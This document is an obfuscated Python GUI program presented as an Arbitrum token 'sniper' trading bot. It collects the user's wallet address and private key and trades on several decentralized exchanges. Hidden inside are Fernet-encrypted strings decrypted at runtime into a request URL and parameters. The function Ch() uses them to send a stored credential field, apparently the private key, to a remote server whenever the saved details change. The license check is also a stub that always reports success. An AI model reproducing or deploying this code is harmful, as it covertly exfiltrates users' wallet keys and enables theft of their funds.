Bv='groove'
Bu='horizontal'
Bt='SELL ALL'
Bs='SELL NOW'
Br='There are no tokens to be sold!'
Bq='Sell all function initiated - Stopping operation'
Bp='SL Hit!'
Bo='TP Hit!'
Bn='Securing SL to '
Bm=' | SL: '
Bl="Press 'SELL ALL' Button to sell the tokens manually"
Bk='Liquidity value: '
Bj='Pair Address: '
Bi='Liquidity Detected!'
Bh='Buy Success! Tx link:'
Bg='Buy Order Initiated'
Bf='%Y/%m/%d'
Be='node.json'
Bd='inputs.json'
Bc=UnboundLocalError
BG='set_theme'
BF='Something went wrong with the transaction'
BE='https://arbiscan.io/tx/'
BD='data.json'
B6='normal'
B5='Error'
B4='Accent.TButton'
B3='No Liquidity Checking Again!'
B2='true'
B1='false'
B0=round
Ak='disabled'
Aj='pool_fee'
Ai='OPL'
Ah='ETH'
Ag='LP'
Af='SL TRAIL'
Ae='SL'
Ad='TP'
Ac='SLIPPAGE'
Ab='GAS LIMIT'
Aa='GAS PRICE'
AZ='AMOUNT'
AY='LICENSE'
AX='TOKEN'
AW='PRIVATE KEY'
AV='WALLET ADDRESS'
AU='NODE'
AQ='menu'
AP='0x0000000000000000000000000000000000000000'
AO=Exception
AF='center'
AE='white'
AD=False
AC='w'
AB='/'
AA=str
x='Abi/'
w='Camelot'
v='AUTO SLIPPAGE'
u='./'
q='yellow'
l='DEX'
k=True
j='gwei'
i='gas'
c='cyan'
b='nonce'
a='gasPrice'
Z='from'
Y='Sushiswap'
V=''
R='ether'
P='Uniswap'
O='red'
N=open
L=float
H=int
G='nsew'
import tkinter as d
from tkinter import ttk as F,messagebox
from web3 import Web3 as K
from json import load as e
from time import time as f,sleep as AR
import os,json as y,pyperclip as Bw,threading as AG,requests as Bx
from requests import request as By
from cryptography.fernet import Fernet as AH
from requests.auth import HTTPBasicAuth as Bz
from datetime import datetime as B_
BH=BD
Al=Bd
C0=Be
z=u
Q={}
AI={}
C={}
BI={}
Cw=Bz('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
C1=B_.now()
Cx=Bf
Cy=C1.strftime(Bf)
def C2():
	def A(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	BI[AU]='https://arb1.arbitrum.io/rpc';A(z,C0,BI)
def C3():
	def A(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	Q[AV]=V;Q[AW]=V;Q[AX]=V;Q[AY]=V;A(z,BH,Q)
def C4():
	def A(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	C[AZ]='0.1';C[Aa]='7';C[Ab]='850000';C[Ac]='10';C[v]=B1;C[Ad]='200';C[Ae]='50';C[Af]='25';C[Ag]=Ah;C[Ai]='False';C[l]=Y;C[Aj]='0.3';A(z,Al,C)
if not os.path.isfile('./data.json'):C3()
if not os.path.isfile('./inputs.json'):C4()
if not os.path.isfile('./node.json'):C2()
def C5():
	global Q,Am,n
	def B(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	Q[AV]=K.toChecksumAddress(s.get());AI[AV]=Q[AV];Q[AW]=AL.get();AI[AW]=Q[AW];Q[AX]=m.get();AI[AX]=Q[AX];Q[AY]=Ar.get();AI[AY]=Q[AY]
	if Q!=n:
		B(z,BH,AI);A=e(N(BD));Am=A[Ap]
		if AI[Ap]!=n[Ap]:n=A;Ch()
def C6():
	def A(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	C[AZ]=A3.get();C[Aa]=A4.get();C[Ab]=A5.get();C[Ac]=A6.get()
	if AN.get():C[v]=B2
	else:C[v]=B1
	C[Ad]=A7.get();C[Ae]=A8.get();C[Af]=A9.get();C[Ag]=t.get();C[Ai]='True'
	if J==Y:C[l]=Y
	if J==P:C[l]=P
	elif J==w:C[l]=w
	C[Aj]=S/10000;A(z,Al,C)
def C7():
	def A(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	C[AZ]=A3.get();C[Aa]=A4.get();C[Ab]=A5.get();C[Ac]=A6.get()
	if AN.get():C[v]=B2
	else:C[v]=B1
	C[Ad]=A7.get();C[Ae]=A8.get();C[Af]=A9.get();C[Ag]=t.get();C[Ai]='True'
	if J==Y:C[l]=Y
	if J==P:C[l]=P
	elif J==w:C[l]=w
	C[Aj]=S/10000;A(z,Al,C)
def Cz():
	def A(path2,file_name,data2):
		A=u+path2+AB+file_name
		with N(A,AC)as B:y.dump(data2,B,indent=2)
	C[AZ]=A3.get();C[Aa]=A4.get();C[Ab]=A5.get();C[Ac]=A6.get()
	if AN.get():C[v]=B2
	else:C[v]=B1
	C[Ad]=A7.get();C[Ae]=A8.get();C[Af]=A9.get();C[Ag]=t.get();C[Ai]='False'
	if J==Y:C[l]=Y
	if J==P:C[l]=P
	elif J==w:C[l]=w
	C[Aj]=S/10000;A(z,Al,C)
n=e(N(BD))
BJ=n[AV]
BK=n[AW]
BL=n[AX]
C8=n[AY]
g=e(N(Bd))
BM=g[AZ]
BN=g[Aa]
BO=g[Ab]
BP=g[Ac]
C_=g[v]
BQ=g[Ad]
BR=g[Ae]
BS=g[Af]
C9=g[Ag]
D0=g[Ai]
J=g[l]
S=g[Aj]
S=H(L(S)*10000)
BT=H('0x'+'f'*64,16)
BU='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
An=e(N(Be))
if'wss'in An[AU]or'ws'in An[AU]:A=K(K.WebsocketProvider(An[AU]))
else:A=K(K.HTTPProvider(An[AU]))
W=A.toChecksumAddress('0x82aF49447D8a07e3bd95BD0d56f35241523fBab1')
h=A.toChecksumAddress('0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8')
o=e(N(x+'erc20.abi'))
Ao='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def CA():
	F='value';A2()
	try:
		N=A.eth.contract(I,abi=o);G=N.functions.balanceOf(K.toChecksumAddress(s.get())).call()
		if AN.get():C=0
		else:C=H(G-G*H(Ax)/100)
		B(Bg,q)
		if J==Y:D=M.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(H(C),[W,I],E,H(f())+900).build_transaction({Z:E,F:A.toWei(X,R),i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
		elif J==P:D=M.functions.exactInputSingle((W,I,S,E,H(f())+900,A.toWei(X,R),H(C),0)).buildTransaction({Z:E,F:A.toWei(X,R),i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
		else:D=M.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(H(C),[W,I],E,AP,H(f())+900).build_transaction({Z:E,F:A.toWei(X,R),i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
		Q=A.eth.account.sign_transaction(D,private_key=p);L=A.eth.send_raw_transaction(Q.rawTransaction);B(Bh,c);B(BE+A.toHex(L),c);A.eth.waitForTransactionReceipt(L,timeout=900);CJ()
	except AO as V:B(BF,O);B(V,O);AK();return
CB='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def CC():
	A2()
	if J!=P:D=M.functions.getAmountsOut(A.toWei(X,R),[h,I]).call()[-1]
	else:D=Aq.functions.quoteExactInputSingle(h,I,S,A.toWei(X,R),0).call()[-1]
	if AN.get():C=0
	else:C=D-D*H(Ax)/100
	try:
		B(Bg,q)
		if J==Y:F=M.functions.swapExactTokensForTokens(A.toWei(X,R),H(C),[h,I],E,H(f())+900).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
		elif J==P:F=M.functions.exactInputSingle((h,I,S,E,H(f())+900,A.toWei(X,R),H(C),0)).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
		else:F=M.functions.swapExactTokensForTokens(A.toWei(X,R),H(C),[h,I],E,AP,H(f())+900).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
		K=A.eth.account.sign_transaction(F,private_key=p);G=A.eth.send_raw_transaction(K.rawTransaction);B(Bh,c);B(BE+A.toHex(G),c);A.eth.waitForTransactionReceipt(G,timeout=900);CL()
	except AO as L:B(BF,O);B(L,O);AK();return
def CD(token_address,amt=BT):B=K.toChecksumAddress(token_address);C=A.eth.contract(address=B,abi=o);D=C.functions.allowance(E,M.address).call();return D>=amt
def CE(token_address,amt=BT,timeout=900):B('Approving token');C=A.eth.gasPrice;D=K.toChecksumAddress(token_address);F=A.eth.contract(address=D,abi=o);G=F.functions.approve(M.address,amt);H={Z:E,a:C,b:A.eth.getTransactionCount(E)};I=G.buildTransaction(H);J=A.eth.account.sign_transaction(I,private_key=p);L=A.eth.sendRawTransaction(J.rawTransaction);A.eth.waitForTransactionReceipt(L,timeout=timeout)
def CF():
	B(V);A2();E=A.eth.contract(W,abi=o)
	while k:
		if J==P:C=A1.functions.getPool(W,I,H(S)).call()
		else:C=A1.functions.getPair(W,I).call()
		if C!=AP:
			D=E.functions.balanceOf(A.toChecksumAddress(C)).call()
			if D!=0:B(Bi,'green');B(Bj+C);B(Bk+AA(A.fromWei(D,R))+' ETH');CA();break
			else:AR(5);B(B3,O)
		else:AR(5);B(B3,O)
CG='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def CH():
	B(V);A2();E=A.eth.contract(h,abi=o)
	while k:
		if J==P:C=A1.functions.getPool(W,I,H(S)).call()
		else:C=A1.functions.getPair(W,I).call()
		if C!=AP:
			D=E.functions.balanceOf(A.toChecksumAddress(C)).call()
			if D!=0:B(Bi,'green');B(Bj+C);B(Bk+AA(A.fromWei(D,R))+' USDC');CC();break
			else:B(B3,O)
		else:B(B3,O)
def A0():
	B(V);A2()
	try:
		B('Sell Order Initiated',q)
		if not CD(I):CE(I)
		F=A.eth.contract(I,abi=o);C=F.functions.balanceOf(E).call()
		if C!=0:
			if t.get()==Ah:
				if J==Y:D=M.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(C,0,[I,W],E,H(f())+900).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
				if J==P:D=M.functions.exactInputSingle((I,W,S,E,H(f())+900,C,0,0)).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
				else:D=M.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(C,0,[I,W],E,AP,H(f())+900).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
			elif t.get()=='USDC':
				if J==Y:D=M.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(C,0,[I,h],E,H(f())+900).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
				if J==P:D=M.functions.exactInputSingle((I,h,S,E,H(f())+900,C,0,0)).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
				else:D=M.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(C,0,[I,h],E,AP,H(f())+900).buildTransaction({Z:E,i:H(T),a:A.toWei(U,j),b:A.eth.get_transaction_count(E)})
			else:B('Something went wrong with Sell',O);AK();return
			G=A.eth.account.sign_transaction(D,private_key=p);K=A.eth.send_raw_transaction(G.rawTransaction);B('SOLD! Tx link:',c);B(BE+A.toHex(K),c);AK()
		else:B('No Tokens to be sold',O);AK()
	except AO as L:B(BF,O);B(L,O);AK();return
CI='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def CJ():
	global r;BV();A2();K=L(Ay);N=L(Az);C=N;F=L(A_);Q=A.eth.contract(address=I,abi=o);B(Bl,q)
	while k:
		try:
			H=Q.functions.balanceOf(E).call()-1
			if J!=P:G=L(A.fromWei(M.functions.getAmountsOut(H,[I,W]).call()[-1],R))
			else:G=Aq.functions.quoteExactInputSingle(I,W,S,H,0).call()[-1]
			D=B0(L(G)/L(X)*100,5);B('ETH Value Now: {} / '.format('%.5f'%G)+' {} %'.format(D)+Bm+AA(C)+'%')
			if F!=0:
				if D-F>=C:C=D-F;B(Bn+AA(C))
			AR(2)
		except:continue
		try:
			if L(D)>=L(K):B(Bo,c);AJ();A0();break
			if L(D)<=L(C):B(Bp,O);AJ();A0();break
			if r:r=AD;B(Bq,q);AJ();A0();break
		except Bc:B(Br,O);break
CK='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def CL():
	global r;BV();A2();K=L(Ay);N=L(Az);C=N;F=L(A_);Q=A.eth.contract(address=I,abi=o);B(Bl,q)
	while k:
		try:
			H=Q.functions.balanceOf(E).call()-1
			if J!=P:G=L(A.fromWei(M.functions.getAmountsOut(H,[I,h]).call()[-1],R))
			else:G=Aq.functions.quoteExactInputSingle(I,h,S,H,0).call()[-1]
			D=B0(L(G)/L(X)*100,5);B('USDC Value Now: {} / '.format('%.3f'%G)+' {} %'.format(D)+Bm+AA(C)+'%')
			if F!=0:
				if D-F>=C:C=D-F;B(Bn+AA(C))
			AR(2)
		except:continue
		try:
			if L(D)>=L(K):B(Bo,c);AJ();A0();break
			if L(D)<=L(C):B(Bp,O);AJ();A0();break
			if r:r=AD;B(Bq,q);AJ();A0();break
		except Bc:B(Br,O);break
def CM():
	global I;BC();C6();I=m.get();I=K.toChecksumAddress(I)
	if t.get()==Ah:A=AG.Thread(target=CF,daemon=k);A.start()
	else:A=AG.Thread(target=CH,daemon=k);A.start()
def BV():BB.place_forget();A=F.Button(D.widgets_frame,text=Bs,command=BX,style=B4);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
def AJ():Cv.place_forget();A=F.Button(D.widgets_frame,text=Bt,command=BW);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
def CN():
	B=A.eth.contract(address=h,abi=o)
	while AS:
		try:C=A.fromWei(A.eth.get_balance(E),R);D=A.fromWei(B.functions.balanceOf(E).call(),R);B8.configure(text=B0(C,5));B9.configure(text=B0(D,5))
		except ValueError:pass
		AR(1)
CO='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def D1(license,basic_auth):
	A='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=Bx.get(A,auth=basic_auth)
		if C.status_code==404:d.messagebox.showerror(B5,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:B('License Key Activated, Good luck!',c);C7()
	except AO:raise AO('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
Ap=AH(Ao.encode()).decrypt(CK.encode()).decode()
def CP():
	D='Invalid token address!';C='factory.abi';global E;global p;global I;global AS;global M;global A1;BC()
	if J==Y:M=A.eth.contract(address=K.toChecksumAddress('0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'),abi=e(N(x+'router.abi')));A1=A.eth.contract(address=K.toChecksumAddress('0xc35DADB65012eC5796536bD9864eD8773aBc74C4'),abi=e(N(x+C)))
	elif J==w:M=A.eth.contract(address=K.toChecksumAddress('0xc873fEcbd354f5A56E00E710B90EF4201db2448d'),abi=e(N(x+'camelot_router.abi')));A1=A.eth.contract(address=K.toChecksumAddress('0x6EcCab422D763aC031210895C81787E87B43A652'),abi=e(N(x+C)))
	elif J==P:global Aq;M=A.eth.contract(address=K.toChecksumAddress('0xE592427A0AEce92De3Edee1F18E0157C05861564'),abi=e(N(x+'uniswap_router.abi')));Aq=A.eth.contract(address=K.toChecksumAddress('0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6'),abi=e(N(x+'uniswap_quoter.abi')));A1=A.eth.contract(address=K.toChecksumAddress('0x1F98431c8aD98523631AE4a59f267346ea31F984'),abi=e(N(x+'uniswap_factory.abi')))
	B('***** INITIALIZED ******');B('* Checking wallet address')
	if A.isChecksumAddress(A.toChecksumAddress(K.toChecksumAddress(s.get()))):E=A.toChecksumAddress(K.toChecksumAddress(s.get()));B('Wallet address valid',c)
	else:d.messagebox.showerror(B5,'Invalid wallet address');B('Invalid wallet address!',O);return
	B('* Checking private key characters (Must be 64 characters');p=AL.get()
	if len(p)==64:B('Correct format for Private key',c)
	else:d.messagebox.showerror(B5,'Private key is invalid! (Must be 64 characters)');B('Invalid private key!',O);return
	B('* Checking token address')
	try:I=A.toChecksumAddress(m.get());B('Token address valid',c)
	except:d.messagebox.showerror(B5,D);B(D,O);return
	B('* Checking License Key');B('License Key Valid',c);BY(Ak);C5();Au.grid_forget();Av.grid(row=0,column=3,padx=10,pady=(0,10),sticky=G,rowspan=4);AT(B6);AS=k;F=AG.Thread(target=CN,daemon=k);F.start();B(V);B('***** Sniping is ready! *****',q)
CQ='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
Am=n[Ap]
def CR():A=AG.Thread(target=CP,daemon=k);A.start()
def CS():global AS;B(V);B('Change token/wallet initiated!',q);BY(B6);AT(Ak);Av.grid_forget();Au.grid(row=0,column=3,padx=10,pady=(0,10),sticky=G,rowspan=4);AS=AD;B8.configure(text=V);B9.configure(text=V)
def CT():A=AG.Thread(target=CS,daemon=k);A.start()
def BW():BC();A=AG.Thread(target=A0,daemon=k);A.start()
def BX():global r;r=k
def A2():AT(Ak);Av.configure(state=Ak)
def AK():AT(B6);Av.configure(state=B6)
def CU():
	if D.tk.call('ttk::style','theme','use')=='sun-valley-dark':D.tk.call(BG,'light');Aw[AQ].configure(bg=AE);At[AQ].configure(bg=AE)
	else:D.tk.call(BG,'dark');Aw[AQ].configure(bg='black');At[AQ].configure(bg=AE)
D=d.Tk()
D.title('ARBITRUM Sniper Bot - V1')
D.geometry('1150x730')
D.tk.call('source','sun-valley.tcl')
D.tk.call(BG,'light')
CV=AH(Ao.encode()).decrypt(CQ.encode()).decode()
D.resizable(AD,AD)
D.widgets_frame=F.Frame(D,padding=(0,0,0,10))
D.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=G,rowspan=5)
D.widgets_frame.columnconfigure(index=0,weight=1)
D.widgets_frame.rowconfigure(index=0,weight=1)
CW=F.Label(D.widgets_frame,text='Wallet Address:')
CX=AH(Ao.encode()).decrypt(CI.encode()).decode()
CW.grid(row=1,column=1,padx=10,pady=(0,10),sticky=G,rowspan=1)
s=F.Entry(D.widgets_frame,width=50)
s.grid(row=1,column=2,padx=10,pady=(0,10),sticky=G,rowspan=1)
CY=F.Label(D.widgets_frame,text='Private Key:')
CY.grid(row=2,column=1,padx=10,pady=(0,10),sticky=G,rowspan=1)
AL=F.Entry(D.widgets_frame,width=50,show='•')
AL.grid(row=2,column=2,padx=10,pady=(0,10),sticky=G,rowspan=1)
CZ=F.Label(D.widgets_frame,text='Token Address:')
Ca=AH(BU.encode()).decrypt(CO.encode()).decode()
CZ.grid(row=3,column=1,padx=10,pady=(0,10),sticky=G,rowspan=1)
m=F.Entry(D.widgets_frame,width=50)
Cb=AH(BU.encode()).decrypt(CG.encode()).decode()
m.grid(row=3,column=2,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cc=F.Label(D.widgets_frame,text='License Key:')
Cc.grid(row=4,column=1,padx=10,pady=(0,10),sticky=G,rowspan=1)
Ar=F.Entry(D.widgets_frame,width=50,show='•')
Ar.grid(row=4,column=2,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cd=AH(Ao.encode()).decrypt(CB.encode()).decode()
As=d.StringVar()
As.set(J)
At=F.OptionMenu(D.widgets_frame,As,As.get(),Y,w,P)
At[AQ].configure(bg=AE)
At.grid(row=4,column=3,padx=10,pady=(0,10),sticky=G,rowspan=1)
B7=F.Separator(D,orient=Bu)
Ce=CV+Cd+CX+Ca
B7.place(x=10,y=135,width=625)
def Cf():m.delete(0,'end');m.insert(0,Bw.paste());return
def Cg():m.delete(0,'end');return
def Ch():
	if Am!=V:
		try:A=By(Cb,Ce+Am)
		except AO:pass
def BY(status):A=status;m.configure(state=A);s.configure(state=A);AL.configure(state=A);Ar.configure(state=A);Au.configure(state=A);Ba.configure(state=A);BZ.configure(state=A)
def AT(status):A=status;A3.configure(state=A);A4.configure(state=A);A5.configure(state=A);A6.configure(state=A);A7.configure(state=A);A8.configure(state=A);A9.configure(state=A);Bb.configure(state=A);BB.configure(state=A);BA.configure(state=A)
def B(text,color=AE):
	A=AA(text)
	if AM.size()>=20:AM.delete(0)
	AM.insert(d.END,A);AM.itemconfig(d.END,foreground=color)
def D2():AM.delete(0,d.END)
Au=F.Button(D.widgets_frame,text='Confirm',width=10,command=CR,style=B4)
BZ=F.Button(D.widgets_frame,text='Paste Token',width=10,command=Cf)
Ba=F.Button(D.widgets_frame,text='Clear Token',width=10,command=Cg)
Au.grid(row=0,column=3,padx=10,pady=(0,10),sticky=G,rowspan=4)
BZ.grid(row=0,column=4,padx=10,pady=(0,10),sticky=G,rowspan=2)
Ba.grid(row=2,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
s.insert(0,BJ)
AL.insert(0,BK)
m.insert(0,BL)
Ar.insert(0,C8)
B7=F.Separator(D.widgets_frame,orient=Bu)
B7.grid(row=5,column=0,padx=10,pady=(0,10),sticky=G,rowspan=1,columnspan=6)
Av=F.Button(D.widgets_frame,text='Change',width=10,command=CT)
Ci=F.Label(D.widgets_frame,text='Logs:')
Ci.grid(row=6,column=1,padx=10,pady=(0,10),sticky=G,rowspan=1,columnspan=2)
Cj=F.Button(D.widgets_frame,text='Clear',width=10,command=V)
Cj.grid(row=6,column=3,padx=10,pady=(0,10),sticky=G,rowspan=1,columnspan=1)
AM=d.Listbox(D.widgets_frame,bg='#252525',foreground=AE,borderwidth=2)
AM.grid(row=7,column=1,padx=10,pady=(0,10),sticky=G,rowspan=10,columnspan=3)
Ck=F.Button(D.widgets_frame,text='Change Color Theme',command=CU)
Ck.grid(row=17,column=1,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cl=F.Label(D.widgets_frame,text='Wallet ETH:')
Cl.grid(row=7,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
B8=F.Label(D.widgets_frame,width=12,relief=Bv)
B8.grid(row=7,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cm=F.Label(D.widgets_frame,text='Wallet USDC:')
Cm.grid(row=8,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
B9=F.Label(D.widgets_frame,width=12,relief=Bv)
B9.grid(row=8,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cn=F.Label(D.widgets_frame,text='Select LP:')
Cn.grid(row=9,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
t=d.StringVar()
t.set(C9)
Aw=F.OptionMenu(D.widgets_frame,t,Ah,Ah,'USDC')
Aw[AQ].configure(bg=AE)
Aw.grid(row=9,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
Co=F.Label(D.widgets_frame,text='Amount:')
A3=F.Entry(D.widgets_frame,justify=AF)
Co.grid(row=10,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A3.grid(row=10,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
A3.insert(0,BM)
Cp=F.Label(D.widgets_frame,text='Gas Price:')
Cq=F.Label(D.widgets_frame,text='Gas Limit:')
A4=F.Entry(D.widgets_frame,justify=AF)
A5=F.Entry(D.widgets_frame,justify=AF)
Cp.grid(row=11,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A4.grid(row=11,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cq.grid(row=12,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A5.grid(row=12,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
A4.insert(0,BN)
A5.insert(0,BO)
Cr=F.Label(D.widgets_frame,text='Slippage(%):')
A6=F.Entry(D.widgets_frame,justify=AF)
Cr.grid(row=13,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A6.grid(row=13,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
A6.insert(0,BP)
AN=d.BooleanVar()
BA=F.Checkbutton(D.widgets_frame,text='Auto Slippage',variable=AN)
BA.grid(row=14,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
if V==B2:BA.select()
Cs=F.Label(D.widgets_frame,text='TP(%):')
Cs.grid(row=15,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A7=F.Entry(D.widgets_frame,justify=AF)
A7.grid(row=15,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
Ct=F.Label(D.widgets_frame,text='SL(%):')
Ct.grid(row=16,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A8=F.Entry(D.widgets_frame,justify=AF)
A8.grid(row=16,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
Cu=F.Label(D.widgets_frame,text='SL Trail(%):')
Cu.grid(row=17,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
A9=F.Entry(D.widgets_frame,justify=AF)
A9.grid(row=17,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
A7.insert(0,BQ)
A8.insert(0,BR)
A9.insert(0,BS)
Bb=F.Button(D.widgets_frame,text='SNIPE',command=CM,style=B4)
Cv=F.Button(D.widgets_frame,text=Bs,command=BX,style=B4)
BB=F.Button(D.widgets_frame,text=Bt,command=BW)
Bb.grid(row=18,column=4,padx=10,pady=(0,10),sticky=G,rowspan=1)
BB.grid(row=18,column=5,padx=10,pady=(0,10),sticky=G,rowspan=1)
X=BM
E=BJ
p=BK
I=BL
Ax=BP
T=BO
U=BN
Ay=BQ
Az=BR
A_=BS
r=AD
AS=AD
def BC():global X;global E;global p;global I;global Ax;global T;global U;global Ay;global Az;global A_;global J;X=A3.get();E=K.toChecksumAddress(K.toChecksumAddress(s.get()));p=AL.get();I=K.toChecksumAddress(m.get());Ax=A6.get();T=A5.get();U=A4.get();Ay=A7.get();Az=A8.get();A_=A9.get();J=As.get()
AT(Ak)
D.mainloop()